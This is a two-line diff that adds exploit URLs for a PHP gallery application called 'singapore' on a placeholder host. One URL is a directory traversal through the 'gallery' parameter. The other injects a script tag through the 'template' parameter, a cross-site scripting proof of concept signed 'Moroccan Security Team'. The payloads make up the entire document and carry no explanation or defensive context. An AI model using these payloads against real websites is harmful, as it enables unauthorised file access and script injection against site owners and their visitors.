@@ -1,0 +1,2 @@
+http://www.example.com/singapore/index.php?gallery=./../../../
+http://www.example.com/singapore/index.php?template=<script>alert('Moroccan Security Team');</script>
